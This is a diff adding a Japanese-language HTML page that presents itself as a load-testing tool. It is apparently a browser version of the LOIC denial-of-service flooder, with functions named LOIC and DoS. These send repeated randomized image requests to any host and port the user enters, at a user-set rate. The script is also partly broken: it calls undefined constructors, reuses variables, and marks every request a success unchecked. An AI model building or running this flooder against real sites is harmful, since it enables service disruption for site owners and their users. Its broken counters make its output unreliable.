@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+  <html>
+    <head>
+      <script>
+        function LOIC(target, port, requestsPerSecond)
+        {
+          var requested = 0;
+          var succeeded = 0;
+          var failed = 0;
+          var isFiring = false;
+          if(target.length == 0)
+          {
+            document.getElementById("errors").innerHTML = "URLを入力してください。";
+          }
+          else if(requestsPerSecond.length == 0)
+          {
+            document.getElementById("errors").innerHTML = "リクエストスピードを入力してください。";
+          }
+          else if(requestsPerSecond == "0" || requestsPerSecond == 0)
+          {
+            document.getElementById("errors").innerHTML = "リクエスト数は0に出来ません。";
+          }
+          else
+          {
+            if(port.length == 0 || port == 0 || port == "0")
+            {
+              port = 80;
+            }
+            var onFail = function()
+            {
+              failed++;
+              document.getElementById("failed").innerHTML = failed;
+            };
+            var onSuccess = function()
+            {
+              succeeded++;
+              document.getElementById("succeeded").innerHTML = succeeded;
+            };
+            var onRequest = function()
+            {
+              requested++;
+              document.getElementById("requests").innerHTML = requested;
+            };
+            var DoS = function()
+            {
+              var image = new Image();
+              image.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image2 = new Image2();
+              image2.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image3 = new Image3();
+              image3.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image4 = new Image4();
+              image4.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image5 = new Image5();
+              image5.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image6 = new Image6();
+              image6.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image7 = new Image7();
+              image7.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image8 = new Image8();
+              image8.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image9 = new Image9();
+              image.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+              var image10 = new Image10();
+              image.src = "http://" + target + ":" + port + "?key=" + Math.floor(Math.random() * 1000);
+              onSuccess();
+              onRequest();
+            };
+            document.getElementById("button").onclick = function()
+            {
+              if(isFiring)
+              {
+                document.getElementById("errors").innerHTML = "";
+                document.getElementById("target").value = "";
+                document.getElementById("port").value = "";
+                document.getElementById("requestsPerSecond").value = "";
+                clearInterval(fireInterval);
+                isFiring = false;
+                document.getElementById("button").innerHTML = "テスト中";
+                document.getElementById("status").innerHTML = "未使用";
+              }
+              else
+              {
+                document.getElementById("errors").innerHTML = "";
+                document.getElementById("target").value = "";
+                document.getElementById("port").value = "";
+                document.getElementById("requestsPerSecond").value = "";
+                isFiring = true;
+                document.getElementById("button").innerHTML = "テスト終了";
+                document.getElementById("status").innerHTML = "テスト中";
+                fireInterval = setInterval(DoS, (1000 / parseInt(requestsPerSecond) |0));
+              }
+            }
+          }
+        }
+      </script>
+      <style>
+          div {
+          background-color: #000;
+          color: #0f0;
+          border: double 4px #0f0;
+          border-radius: 10px;
+          width: 200px;
+          }
+          #errors {
+              color: #f00;
+          }
+      </style>
+      <title>
+        負荷テスト 5X
+      </title>
+        <script
+  src="https://code.jquery.com/jquery-3.6.0.min.js"
+  integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+  crossorigin="anonymous"></script>
+    </head>
+    <body>
+        <h1>負荷テストツール</h1>
+        <input type="url" name="target" id="target" placeholder="URLを入力" />
+        <br />
+        <input type="number" name="port" id="port" placeholder="ポート（任意）" />
+        <br />
+        <input type="number" name="requestsPerSecond" id="requestsPerSecond" placeholder="リクエストスピード（少ない方が多い）" />
+        <br />
+        <button name="button" id="button" onclick="javascript:LOIC(document.getElementById('target').value, document.getElementById('port').value, document.getElementById('requestsPerSecond').value);">テスト</button>
+        <br><sup name="errors" id="errors">
+        </sup>
+        <br />
+        <div id="param">
+        リクエスト数:
+        <span name="requests" id="requests">
+          0
+        </span>
+        <br />
+        成功数:
+        <span name="succeeded" id="succeeded">
+          0
+        </span>
+        <br />
+        失敗数:
+        <span name="failed" id="failed">
+          0
+        </span>
+        <br />
+        Status:
+        <span name="status" id="status">
+          未使用
+        </span>
+        </div>
+    </body>
+  </html>
